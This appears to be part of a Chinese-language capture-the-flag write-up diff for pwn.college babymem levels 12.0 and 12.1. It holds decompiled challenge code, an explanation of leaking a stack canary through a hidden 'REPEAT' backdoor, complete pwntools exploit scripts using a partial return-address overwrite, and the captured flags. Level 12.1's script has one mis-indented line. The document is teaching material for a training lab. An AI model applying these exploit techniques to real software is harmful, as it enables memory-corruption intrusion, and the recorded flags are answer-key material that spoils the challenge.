@@ -4107,3 +4107,494 @@ except Exception as e:
 #### Flag
 
 Flag: `pwn.college{I5165He8SxPMM_8YzEz5DkzRZ1c.0FMxMDL5cTNxgzW}`
+
+### Level 12.0
+
+#### Information
+
+- Category: Pwn
+
+#### Description
+
+> Defeat a stack canary in a PIE binary by utilizing a bug left in the binary.
+
+#### Write-up
+
+```c ins={146-150} del={112, 143} collapse={1-108, 116-139, 154-156}
+__int64 __fastcall challenge(unsigned int a1, __int64 a2, __int64 a3)
+{
+  int *v3; // rax
+  char *v4; // rax
+  __int64 v6; // [rsp+0h] [rbp-60h] BYREF
+  __int64 v7; // [rsp+8h] [rbp-58h]
+  __int64 v8; // [rsp+10h] [rbp-50h]
+  unsigned int v9; // [rsp+1Ch] [rbp-44h]
+  int v10; // [rsp+2Ch] [rbp-34h]
+  size_t nbytes; // [rsp+30h] [rbp-30h] BYREF
+  void *buf; // [rsp+38h] [rbp-28h]
+  _QWORD v13[2]; // [rsp+40h] [rbp-20h] BYREF
+  char v14; // [rsp+50h] [rbp-10h]
+  unsigned __int64 v15; // [rsp+58h] [rbp-8h]
+  __int64 savedregs; // [rsp+60h] [rbp+0h] BYREF
+  _UNKNOWN *retaddr; // [rsp+68h] [rbp+8h] BYREF
+
+  v9 = a1;
+  v8 = a2;
+  v7 = a3;
+  v15 = __readfsqword(0x28u);
+  v13[0] = 0LL;
+  v13[1] = 0LL;
+  v14 = 0;
+  buf = v13;
+  nbytes = 0LL;
+  puts("The challenge() function has just been launched!");
+  sp_ = (__int64)&v6;
+  bp_ = (__int64)&savedregs;
+  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)&v6) >> 3) + 2;
+  rp_ = (__int64)&retaddr;
+  puts("Before we do anything, let's take a look at challenge()'s stack frame:");
+  DUMP_STACK(sp_, sz_);
+  printf("Our stack pointer points to %p, and our base pointer points to %p.\n", (const void *)sp_, (const void *)bp_);
+  printf("This means that we have (decimal) %d 8-byte words in our stack frame,\n", sz_);
+  puts("including the saved base pointer and the saved return address, for a");
+  printf("total of %d bytes.\n", 8 * sz_);
+  printf("The input buffer begins at %p, partway through the stack frame,\n", buf);
+  puts("(\"above\" it in the stack are other local variables used by the function).");
+  puts("Your input will be read into this buffer.");
+  printf("The buffer is %d bytes long, but the program will let you provide an arbitrarily\n", 17);
+  puts("large input length, and thus overflow the buffer.\n");
+  puts("In this level, there is no \"win\" variable.");
+  puts("You will need to force the program to execute the win_authed() function");
+  puts("by directly overflowing into the stored return address back to main,");
+  printf(
+    "which is stored at %p, %d bytes after the start of your input buffer.\n",
+    (const void *)rp_,
+    rp_ - (_DWORD)buf);
+  printf(
+    "That means that you will need to input at least %d bytes (%d to fill the buffer,\n",
+    rp_ - (_DWORD)buf + 8,
+    17);
+  printf("%d to fill other stuff stored between the buffer and the return address,\n", rp_ - (_DWORD)buf - 17);
+  puts("and 8 that will overwrite the return address).\n");
+  cp_ = bp_;
+  cv_ = __readfsqword(0x28u);
+  while ( *(_QWORD *)cp_ != cv_ )
+    cp_ -= 8LL;
+  puts("Because the binary is position independent, you cannot know");
+  puts("exactly where the win_authed() function is located.");
+  puts("This means that it is not clear what should be written into the return address.\n");
+  printf("Payload size: ");
+  __isoc99_scanf("%lu", &nbytes);
+  printf("You have chosen to send %lu bytes of input!\n", nbytes);
+  printf("This will allow you to write from %p (the start of the input buffer)\n", buf);
+  printf(
+    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
+    (char *)buf + nbytes,
+    nbytes - 17);
+  printf("Of these, you will overwrite %d bytes into the return address.\n", nbytes + (_DWORD)buf - rp_);
+  puts("If that number is greater than 8, you will overwrite the entire return address.\n");
+  puts("Overwriting the entire return address is fine when we know");
+  puts("the whole address, but here, we only really know the last three nibbles.");
+  puts("These nibbles never change, because pages are aligned to 0x1000.");
+  puts("This gives us a workaround: we can overwrite the least significant byte");
+  puts("of the saved return address, which we can know from debugging the binary,");
+  puts("to retarget the return to main to any instruction that shares the other 7 bytes.");
+  puts("Since that last byte will be constant between executions (due to page alignment),");
+  puts("this will always work.");
+  puts("If the address we want to redirect execution to is a bit farther away from");
+  puts("the saved return address, and we need to write two bytes, then one of those");
+  puts("nibbles (the fourth least-significant one) will be a guess, and it will be");
+  puts("incorrect 15 of 16 times.");
+  puts("This is okay: we can just run our exploit a few times until it works");
+  puts("(statistically, ~50% chance after 11 times and ~90% chance after 36 times).");
+  puts("One caveat in this challenge is that the win_authed() function must first auth:");
+  puts("it only lets you win if you provide it with the argument 0x1337.");
+  puts("Speifically, the win_authed() function looks something like:");
+  puts("    void win_authed(int token)");
+  puts("    {");
+  puts("      if (token != 0x1337) return;");
+  puts("      puts(\"You win! Here is your flag: \");");
+  puts("      sendfile(1, open(\"/flag\", 0), 0, 256);");
+  puts("      puts(\"\");");
+  puts("    }");
+  puts(byte_3E5B);
+  puts("So how do you pass the check? There *is* a way, and we will cover it later,");
+  puts("but for now, we will simply bypass it! You can overwrite the return address");
+  puts("with *any* value (as long as it points to executable code), not just the start");
+  puts("of functions. Let's overwrite past the token check in win!\n");
+  puts("To do this, we will need to analyze the program with objdump, identify where");
+  puts("the check is in the win_authed() function, find the address right after the check,");
+  puts("and write that address over the saved return address.\n");
+  puts("Go ahead and find this address now. When you're ready, input a buffer overflow");
+  printf(
+    "that will overwrite the saved return address (at %p, %d bytes into the buffer)\n",
+    (const void *)rp_,
+    rp_ - (_DWORD)buf);
+  puts("with the correct value.\n");
+  printf("Send your payload (up to %lu bytes)!\n", nbytes);
+  v10 = read(0, buf, nbytes);
+  if ( v10 < 0 )
+  {
+    v3 = __errno_location();
+    v4 = strerror(*v3);
+    printf("ERROR: Failed to read input -- %s!\n", v4);
+    exit(1);
+  }
+  printf("You sent %d bytes!\n", v10);
+  puts("Let's see what happened with the stack:\n");
+  DUMP_STACK(sp_, sz_);
+  puts("The program's memory status:");
+  printf("- the input buffer starts at %p\n", buf);
+  printf("- the saved frame pointer (of main) is at %p\n", (const void *)bp_);
+  printf("- the saved return address (previously to main) is at %p\n", (const void *)rp_);
+  printf("- the saved return address is now pointing to %p.\n", *(const void **)rp_);
+  printf("- the canary is stored at %p.\n", (const void *)cp_);
+  printf("- the canary value is now %p.\n", *(const void **)cp_);
+  printf("- the address of win_authed() is %p.\n", win_authed);
+  putchar(10);
+  puts("If you have managed to overwrite the return address with the correct value,");
+  puts("challenge() will jump straight to win_authed() when it returns.");
+  printf("Let's try it now!\n\n");
+  if ( (unsigned __int64)buf + v10 > rp_ + 2 )
+  {
+    puts("WARNING: You sent in too much data, and overwrote more than two bytes of the address.");
+    puts("         This can still work, because I told you the correct address to use for");
+    puts("         this execution, but you should not rely on that information.");
+    puts("         You can solve this challenge by only overwriting two bytes!");
+    puts("         ");
+  }
+  printf("You said: %s\n", (const char *)buf);
+  puts("This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()");
+  puts("call to see the hidden backdoor!");
+  if ( strstr((const char *)buf, "REPEAT") )
+  {
+    puts("Backdoor triggered! Repeating challenge()");
+    return challenge(v9, v8, v7);
+  }
+  else
+  {
+    puts("Goodbye!");
+    return 0LL;
+  }
+}
+```
+
+虽说是一道蛮综合的题，不过我感觉不算难，就简单说说思路好了。这个程序的问题就在于我们可以提供任意输入溢出 `buf`，覆盖返回地址。但是这里有一个 canary 保护需要绕过。
+
+我们注意到有一条 `printf` 会输出我们栈上的内容，那我们是不是可以填满整个 `buf`，直到 canary 为止？这样 `printf` 就会把 canary 泄漏出来。结合 `printf` 判断字符串结束的机制，以及 `canary` 固定以 `\x00` 结尾，我们需要用一个任意字符填上这个空，这样就把 canary 泄漏出来了。
+
+`strstr` 函数的定义如下，它会从 `haystack` 中搜索 `needle` 第一次出现的位置，返回这个位置的指针。如果没匹配到，则返回 `NULL`。
+
+```c
+// attributes: thunk
+char *strstr(const char *haystack, const char *needle)
+{
+  return strstr(haystack, needle);
+}
+```
+
+> 对于这个函数最好还知道：
+>
+> - 如果 `needle` 是空字符串，则 `strstr` 总是返回 `haystack` 的指针。
+> - `strstr` 是大小写敏感的，`strcasestr` 大小写不敏感。
+
+> 还有 `strchr` 返回字符串中第一个匹配的字符的指针。`memcmp` 比较指定内存区域的内容，适用于更通用的场景，`strstr` 则是处理简单字符串匹配问题的实用工具，适用于无需高性能优化的场景。
+>
+> 说这些只是我觉得了解下说不定会有帮助，要是哪天比赛碰上了，到时候能不能查还说不准…… ~（想起了乔布斯说的：美妙人生，把点连成线）~
+>
+> ~好吧，其实主要是 `ChatGPT` 都说了，那我可不得好好利用一下，啰嗦两句？xD~
+
+`if ( strstr((const char *)buf, "REPEAT") )` 判断输入中是否包含 `REPEAT`，如果包含的话就会再次调用 `challenge`。因为是同一个进程再次调用 `challenge`，所以 canary 的值不会改变，这就让我们泄漏出来的 canary 派上用场了。
+
+绕过这个 `win_authed` 检测没啥好说的了吧，返回地址重定位到内部代码块开始执行即可。
+
+```c ins={10} del={8} collapse={1-4, 14-35}
+void __fastcall win_authed(int a1)
+{
+  int *v1; // rax
+  char *v2; // rax
+  int *v3; // rax
+  char *v4; // rax
+
+  if ( a1 == 4919 )
+  {
+    puts("You win! Here is your flag:");
+    flag_fd_5715 = open("/flag", 0);
+    if ( flag_fd_5715 < 0 )
+    {
+      v1 = __errno_location();
+      v2 = strerror(*v1);
+      printf("\n  ERROR: Failed to open the flag -- %s!\n", v2);
+      if ( geteuid() )
+      {
+        puts("  Your effective user id is not 0!");
+        puts("  You must directly run the suid binary in order to have the correct permissions!");
+      }
+      exit(-1);
+    }
+    flag_length_5716 = read(flag_fd_5715, &flag_5714, 0x100uLL);
+    if ( flag_length_5716 <= 0 )
+    {
+      v3 = __errno_location();
+      v4 = strerror(*v3);
+      printf("\n  ERROR: Failed to read the flag -- %s!\n", v4);
+      exit(-1);
+    }
+    write(1, &flag_5714, flag_length_5716);
+    puts("\n");
+  }
+}
+```
+
+当时这题困扰住我的倒不是如何构造攻击链的问题，而是写 exp 的问题……脑子抽了企图在 `return challenge(v9, v8, v7);` 这里返回到 `win_authed`，但是这是写死在代码段的，而且权限是 `r-xp`，小小栈溢出岂能覆盖？后来发现整体思路还少了一步，应该是先触发一次后门泄漏 canary，然后第二次执行的时候就不需要触发后门了，直接覆盖 `challenge` 的返回地址就好了。
+
+随便扯两句心里话吧。踩了不少坑，希望以后可以争取做到更严谨完善的分析。还有就是动态调试很重要哦～感觉自己多少还是有一点调试恐惧症 LMAO
+
+#### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, context, gdb, log, pause, process, random, remote
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-12-0"
+HOST, PORT = "pwn.college", 1337
+
+gdbscript = """
+b *challenge+1339
+b *challenge+1821
+c
+"""
+
+
+def to_hex_bytes(data):
+    return "".join(f"\\x{byte:02x}" for byte in data)
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+backdoor = b"REPEAT "
+backdoor_trigger = b"".ljust(0x12, b"A") + backdoor
+padding_to_canary = b"".ljust(0x18, b"A")
+padding_to_ret = b"".ljust(0x8, b"A")
+fixed_offset = b"\xe0"
+possible_bytes = [bytes([i]) for i in range(0x03, 0x103, 0x10)]
+
+
+def send_payload(target, payload):
+    try:
+        payload_size = f"{len(payload)}".encode()
+
+        target.sendlineafter(b"Payload size: ", payload_size)
+        target.sendafter(b"Send your payload", payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def leak_canary(target):
+    try:
+        send_payload(target, backdoor_trigger)
+        target.recvuntil(backdoor)
+
+        canary = b"\x00" + target.recv(0x7)
+        log.success(f"Canary: {to_hex_bytes(canary)}")
+
+        return canary
+    except Exception as e:
+        log.exception(f"An error occurred while leaking canary: {e}")
+
+
+def construct_payload(target):
+    canary = leak_canary(target)
+
+    payload = padding_to_canary
+    payload += canary
+    payload += padding_to_ret
+    payload += fixed_offset + random.choice(possible_bytes)
+
+    return payload
+
+
+def attack(target, payload):
+    try:
+        send_payload(target, payload)
+
+        response = target.recvall()
+
+        return b"pwn.college{" in response
+    except Exception as e:
+        log.exception(f"An error occurred while perform attack: {e}")
+
+
+def main():
+    while True:
+        target = launch()
+
+        try:
+            payload = construct_payload(target)
+
+            if attack(target, payload):
+                log.success("Success! Exiting...")
+
+                pause()
+                exit()
+            else:
+                target.close()
+                target = launch()
+        except Exception as e:
+            log.exception(f"An error occurred in main loop: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+#### Flag
+
+Flag: `pwn.college{YkuEQhg7aejOObKgMu4MNlIgI-S.0VMxMDL5cTNxgzW}`
+
+### Level 12.1
+
+#### Information
+
+- Category: Pwn
+
+#### Description
+
+> Defeat a stack canary in a PIE binary by utilizing a bug left in the binary.
+
+#### Write-up
+
+和上题一样啊，不说了。
+
+#### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, context, gdb, log, pause, process, random, remote
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-12-1"
+HOST, PORT = "pwn.college", 1337
+
+gdbscript = """
+b *challenge+298
+c
+"""
+
+
+def to_hex_bytes(data):
+    return "".join(f"\\x{byte:02x}" for byte in data)
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+backdoor = b"REPEAT "
+backdoor_trigger = b"".ljust(0x82, b"A") + backdoor
+padding_to_canary = b"".ljust(0x88, b"A")
+padding_to_ret = b"".ljust(0x8, b"A")
+fixed_offset = b"\xcd"
+possible_bytes = [bytes([i]) for i in range(0x03, 0x103, 0x10)]
+
+
+def send_payload(target, payload):
+    try:
+        payload_size = f"{len(payload)}".encode()
+
+        target.sendlineafter(b"Payload size: ", payload_size)
+        target.sendafter(b"Send your payload", payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def leak_canary(target):
+    try:
+        send_payload(target, backdoor_trigger)
+        target.recvuntil(backdoor)
+
+        canary = b"\x00" + target.recv(0x7)
+        log.success(f"Canary: {to_hex_bytes(canary)}")
+
+        return canary
+    except Exception as e:
+log.exception(f"An error occurred while leaking canary: {e}")
+
+
+def construct_payload(target):
+    canary = leak_canary(target)
+
+    payload = padding_to_canary
+    payload += canary
+    payload += padding_to_ret
+    payload += fixed_offset + random.choice(possible_bytes)
+
+    return payload
+
+
+def attack(target, payload):
+    try:
+        send_payload(target, payload)
+
+        response = target.recvall()
+
+        return b"pwn.college{" in response
+    except Exception as e:
+        log.exception(f"An error occurred while perform attack: {e}")
+
+
+def main():
+    while True:
+        target = launch()
+
+        try:
+            payload = construct_payload(target)
+
+            if attack(target, payload):
+                log.success("Success! Exiting...")
+
+                pause()
+                exit()
+            else:
+                target.close()
+                target = launch()
+        except Exception as e:
+            log.exception(f"An error occurred in main loop: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+#### Flag
+
+Flag: `pwn.college{Q8RGfsaRLXQyi0mLIgR3c7-_jYK.0lMxMDL5cTNxgzW}`
